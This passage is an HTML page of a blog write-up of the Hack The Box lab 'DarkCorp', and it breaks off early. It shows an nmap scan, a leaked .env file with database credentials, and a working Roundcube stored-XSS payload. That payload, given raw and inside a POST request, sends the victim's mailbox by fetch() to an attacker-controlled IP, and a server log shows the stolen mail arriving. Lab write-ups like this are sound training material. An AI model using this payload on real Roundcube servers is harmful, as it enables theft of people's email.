<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/10/18/hackthebox-darkcorp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewDarkCorp is an insance-difficulty machine from Hack The Box with the following scenario: Recon -&gt; Roundcube stored XSS (contact form) -&gt; Mail exfiltration via XSS -&gt; Capture password-">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: DarkCorp">
<meta property="og:url" content="http://fouedsaidi.com/2025/10/18/Hackthebox-DarkCorp/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewDarkCorp is an insance-difficulty machine from Hack The Box with the following scenario: Recon -&gt; Roundcube stored XSS (contact form) -&gt; Mail exfiltration via XSS -&gt; Capture password-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkCorp/DarkCorp.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkCorp/web1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkCorp/web2.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkCorp/finally.png">
<meta property="article:published_time" content="2025-10-18T17:20:18.000Z">
<meta property="article:modified_time" content="2025-10-18T18:02:47.531Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkCorp/DarkCorp.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: DarkCorp -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI ðŸ‘‹","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: DarkCorp</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-10-18 20:20:18</span>
        <span class="mobile">2025-10-18 20:20:18</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-18 21:02:47</span>
            <span class="mobile">2025-10-18 21:02:47</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>DarkCorp is an insance-difficulty machine from Hack The Box with the following scenario: Recon -&gt; Roundcube stored XSS (contact form) -&gt; Mail exfiltration via XSS -&gt; Capture password-reset tokens -&gt; Password reset takeover -&gt; SQL injection (pg_read_file) -&gt; .env disclosure (DB creds, secrets) -&gt; PKINIT &#x2F; certificate auth to get TGT -&gt; Recover machine nthash (WEB-01$) -&gt; Kerberos ticket forging (ticketer.py) &#x2F; pass-the-ticket -&gt; Dump NTDS &#x2F; SAM &#x2F; LSA (secretsdump) -&gt; PetitPotam &#x2F; EfsRpc NTLM relay techniques -&gt; GPO abuse (pyGPOAbuse) to create scheduled task -&gt; Add local admin &#x2F; escalate via GPO -&gt; Remote code execution &#x2F; shell via Evil-WinRM -&gt; DPAPI &#x2F; CredMan extraction (DonPAPI) -&gt; Extracted plaintext Administrator credentials -&gt; Privilege escalation to Administrator.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/DarkCorp/DarkCorp.png"
                      alt="DarkCorp"
                ><figcaption>DarkCorp</figcaption></figure></p>
<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)</span><br><span class="line">|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.22.1</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.22.1</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 138.32 seconds</span></span><br></pre></td></tr></table></figure></div>

<p>The box is declared as a windows machine, yet we have a linux machine nmap scan. That means that we have a linux machine that is domain joined to a domain controller.<br>We have port 80 open declaring a web application.<br>When we try to access it, we are redirected to <code>http://mail.drip.htb/</code>, so lets add that entry to our <code>/etc/hosts</code> file.<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/DarkCorp/web1.png"
                      alt="Roundcube"
                ><figcaption>Roundcube</figcaption></figure><br>We have a roundcube instance which is basically an emailing solution with  version: 1.6.7.<br>Doing some enumeration, we can also find this endpoint with .env data <a class="link"   target="_blank" rel="noopener" href="http://drip.darkcorp.htb/dashboard/.env" >http://drip.darkcorp.htb/dashboard/.env <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># True for development, False for production</span></span><br><span class="line">DEBUG=False</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask ENV</span></span><br><span class="line">FLASK_APP=run.py</span><br><span class="line">FLASK_ENV=development</span><br><span class="line"></span><br><span class="line"><span class="comment"># If not provided, a random one is generated </span></span><br><span class="line"><span class="comment"># SECRET_KEY=&lt;YOUR_SUPER_KEY_HERE&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Used for CDN (in production)</span></span><br><span class="line"><span class="comment"># No Slash at the end</span></span><br><span class="line">ASSETS_ROOT=/static/assets</span><br><span class="line"></span><br><span class="line"><span class="comment"># If DB credentials (if NOT provided, or wrong values SQLite is used) </span></span><br><span class="line">DB_ENGINE=postgresql</span><br><span class="line">DB_HOST=localhost</span><br><span class="line">DB_NAME=dripmail</span><br><span class="line">DB_USERNAME=dripmail_dba</span><br><span class="line">DB_PASS=2Qa2SsBkQvsc</span><br><span class="line">DB_PORT=5432</span><br><span class="line"></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail&#x27;</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = True</span><br><span class="line">SECRET_KEY = <span class="string">&#x27;GCqtvsJtexx5B7xHNVxVj0y2X0m10jq&#x27;</span></span><br><span class="line">MAIL_SERVER = <span class="string">&#x27;drip.htb&#x27;</span></span><br><span class="line">MAIL_PORT = 25</span><br><span class="line">MAIL_USE_TLS = False</span><br><span class="line">MAIL_USE_SSL = False</span><br><span class="line">MAIL_USERNAME = None</span><br><span class="line">MAIL_PASSWORD = None</span><br><span class="line">MAIL_DEFAULT_SENDER = <span class="string">&#x27;support@drip.htb&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>Now playing with the contact form under <code>/contact</code>, we can change the destination email to our email in the request and we will receive this:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.  </span><br><span class="line">If you suspect that you<span class="string">&#x27;ve received a &quot;phishing&quot; e-mail, please forward the entire email to our security engineer atÂ [bcase@drip.htb](mailto:bcase@drip.htb)</span></span><br></pre></td></tr></table></figure></div>

<p>Also with some googling we find that there is an XSS in roundcube v1.6.7 in contact form on bcase user.<br>This will be our payload:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=kujen&amp;email=kujen@drip.htb&amp;message=&lt;body title=<span class="string">&quot;bgcolor=foo&quot;</span> name=<span class="string">&quot;bar style=animation-name:progress-bar-stripes onanimationstart=fetch(&#x27;/?_task=mail&amp;_action=show&amp;_uid=3&amp;_mbox=INBOX&amp;_extwin=1&#x27;).then(r=&gt;r.text()).then(t=&gt;fetch(`http://10.10.16.20/c=<span class="variable">$&#123;btoa(t)&#125;</span>`))  foo=bar&quot;</span>&gt;Foo&lt;/body&gt;&amp;content=html&amp;recipient=bcase@drip.htb</span><br></pre></td></tr></table></figure></div>

<p>And we change it into the request:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /contact HTTP/1.1</span><br><span class="line">Host: drip.htb</span><br><span class="line">Content-Length: 440</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://drip.htb</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Sec-GPC: 1</span><br><span class="line">Accept-Language: en-US,en;q=0.6</span><br><span class="line">Referer: http://drip.htb/index</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiN2RlMTc2YWJmYzA5NDc3NDZlYjExOGYzYWEyODJkYWVmZTE3YWM1NCJ9.Z65HuQ.PAgXqD2w-R0gz0_G3BuKM-Lon84</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">name=kujen&amp;email=kujen&amp;message=%3Cbody%20title%3D%22bgcolor%3Dfoo%22%20name%3D%22bar%20style%3Danimation-name%3Aprogress-bar-stripes%20onanimationstart%3Dfetch%28%27%2F%3F_task%3Dmail%26_action%3Dshow%26_uid%3D3%26_mbox%3DINBOX%26_extwin%3D1%27%29.<span class="keyword">then</span>%28r%3D%3Er.text%28%29%29.<span class="keyword">then</span>%28t%3D%3Efetch%28%60http%3A%2F%2F10.10.16.20%2Fc%3D%24%7Bbtoa%28t%29%7D%60%29%29%20%20foo%3Dbar%22%3EFoo%3C%2Fbody%3E&amp;content=html&amp;recipient=bcase%40drip.htb</span><br></pre></td></tr></table></figure></div>

<p>We will receive this on our local http server:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; python3 -m http.server 80</span><br><span class="line">Serving HTTP on :: port 80 (http://[::]:80/) ...</span><br><span class="line">::ffff:10.129.161.63 - - [13/Feb/2025 20:22:41] code 404, message File not found</span><br><span class="line">::ffff:10.129.161.63 - - [13/Feb/2025 20:22:41] <span class="string">&quot;GET /c=PCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPjx0aXRsZT5EcmlwTWFpbCBXZWJtYWlsIDo6IEN1c3RvbWVyIEluZm9ybWF0aW9uIFJlcXVlc3Q8L3RpdGxlPgoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8sIG1heGltdW0tc2NhbGU9MS4wIj48bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iI2Y0ZjRmNCI+PG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1uYXZidXR0b24tY29sb3IiIGNvbnRlbnQ9IiNmNGY0ZjQiPgoJPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJza2lucy9lbGFzdGljL2ltYWdlcy9mYXZpY29uLmljbz9zPTE3MTYxMDcyMzciPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJza2lucy9lbGFzdGljL2RlcHMvYm9vdHN0cmFwLm1pbi5jc3M/cz0xNzE2MTA3MjQ1Ij4KCQoJCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic2tpbnMvZWxhc3RpYy9zdHlsZXMvc3R5bGVzLm1pbi5jc3M/cz0xNzE2MTA3MjM3Ij4KCQkKCQoJCgkJPHNjcmlwdD4KCQl0cnkgewoJCQlpZiAoZG9jdW1lbnQuY29va2llLmluZGV4T2YoJ2NvbG9yTW9kZT1kYXJrJykgPiAtMQoJCQkJfHwgKGRvY3VtZW50LmNvb2tpZS5pbmRleE9mKCdjb2xvck1vZGU9bGlnaHQnKSA9PT0gLTEgJiYgd2luZG93Lm1hdGNoTWVkaWEoJyhwcmVmZXJzLWNvbG9yLXNjaGVtZTogZGFyayknKS5tYXRjaGVzKQoJCQkpIHsKCQkJCWRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5jbGFzc05hbWUgKz0gJyBkYXJrLW1vZGUnOwoJCQl9CgkJfSBjYXRjaCAoZSkgeyB9CgkJPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0icGx1Z2lucy9qcXVlcnl1aS90aGVtZXMvZWxhc3RpYy9qcXVlcnktdWkubWluLmNzcz9zPTE3MTYxMDcyMzciPjxzY3JpcHQgc3JjPSJwcm9ncmFtL2pzL2pxdWVyeS5taW4uanM/cz0xNzE2MTA3MjQyIj48L3NjcmlwdD48c2NyaXB0IHNyYz0icHJvZ3JhbS9qcy9jb21tb24ubWluLmpzP3M9MTcxNjEwNzIzNyI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9InByb2dyYW0vanMvYXBwLm1pbi5qcz9zPTE3MTYxMDcyMzciPjwvc2NyaXB0PjxzY3JpcHQ+Ci8qCiAgICAgICAgQGxpY3N0YXJ0ICBUaGUgZm9sbG93aW5nIGlzIHRoZSBlbnRpcmUgbGljZW5zZSBub3RpY2UgZm9yIHRoZSAKICAgICAgICBKYXZhU2NyaXB0IGNvZGUgaW4gdGhpcyBwYWdlLgoKICAgICAgICBDb3B5cmlnaHQgKEMpIFRoZSBSb3VuZGN1YmUgRGV2IFRlYW0KCiAgICAgICAgVGhlIEphdmFTY3JpcHQgY29kZSBpbiB0aGlzIHBhZ2UgaXMgZnJlZSBzb2Z0d2FyZTogeW91IGNhbiByZWRpc3RyaWJ1dGUKICAgICAgICBpdCBhbmQvb3IgbW9kaWZ5IGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKICAgICAgICBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVyIHZlcnNpb24gMyBvZgogICAgICAgIHRoZSBMaWNlbnNlLCBvciAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKICAgICAgICBUaGUgY29kZSBpcyBkaXN0cmlidXRlZCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkCiAgICAgICAgd2FycmFudHkgb2YgTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLgogICAgICAgIFNlZSB0aGUgR05VIEdQTCBmb3IgbW9yZSBkZXRhaWxzLgoKICAgICAgICBAbGljZW5kICBUaGUgYWJvdmUgaXMgdGhlIGVudGlyZSBsaWNlbnNlIG5vdGljZQogICAgICAgIGZvciB0aGUgSmF2YVNjcmlwdCBjb2RlIGluIHRoaXMgcGFnZS4KKi8KdmFyIHJjbWFpbCA9IG5ldyByY3ViZV93ZWJtYWlsKCk7CnJjbWFpbC5zZXRfZW52KHsidGFzayI6Im1haWwiLCJzdGFuZGFyZF93aW5kb3dzIjpmYWxzZSwibG9jYWxlIjoiZW5fVVMiLCJkZXZlbF9tb2RlIjpudWxsLCJyY3ZlcnNpb24iOjEwNjA3LCJjb29raWVfZG9tYWluIjoiIiwiY29va2llX3BhdGgiOiIvIiwiY29va2llX3NlY3VyZSI6ZmFsc2UsImRhcmtfbW9kZV9zdXBwb3J0Ijp0cnVlLCJza2luIjoiZWxhc3RpYyIsImV4dHdpbiI6MSwiYmxhbmtwYWdlIjoic2tpbnMvZWxhc3RpYy93YXRlcm1hcmsuaHRtbCIsInJlZnJlc2hfaW50ZXJ2YWwiOjEwLCJzZXNzaW9uX2xpZmV0aW1lIjo2MDAsImFjdGlvbiI6InNob3ciLCJjb21tX3BhdGgiOiIvP190YXNrPW1haWwiLCJ1c2VyX2lkIjoidHdaTGdnZUJxb1hMVWZOSyIsImNvbXBvc2VfZXh0d2luIjpmYWxzZSwiZGF0ZV9mb3JtYXQiOiJ5eS1tbS1kZCIsImRhdGVfZm9ybWF0X2xvY2FsaXplZCI6IllZWVktTU0tREQiLCJicm93c2VyX2NhcGFiaWxpdGllcyI6eyJwZGYiOiIxIiwiZmxhc2giOiIwIiwidGlmZiI6IjAiLC